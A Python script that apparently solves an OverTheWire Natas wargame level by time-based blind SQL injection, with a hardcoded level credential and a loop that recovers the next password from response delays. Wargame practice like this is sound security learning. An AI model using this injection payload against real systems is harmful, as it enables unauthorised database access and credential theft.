#!/usr/bin/env python3
import requests
import time

password = list("a")
endIndex = 0
usernm = "natas17"
passwd = "EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC"

def increment(password, endIndex):
    if (password[endIndex] == "z"):
        password[endIndex] = "A"
    elif (password[endIndex] == "Z"):
        password[endIndex] = "0"
    else:
        password[endIndex] = chr(ord(password[endIndex]) + 1)


session = requests.Session()
url = "http://natas17.natas.labs.overthewire.org"

while (endIndex < 32):
    print(f"Trying: {"".join(password)}")
    start = time.time()
    res = session.post(url, data={"username":f'natas18" AND password LIKE BINARY "{"".join(password)}%" AND sleep(5); #', "submit":"Check existence"}, auth = (usernm, passwd))
    end = time.time()
    length = end - start
    if length > 5:
        endIndex += 1
        if (endIndex < 32):
            password.append("a")
    else:
        increment(password, endIndex)
print("Password is: ", end="")
print("".join(password))
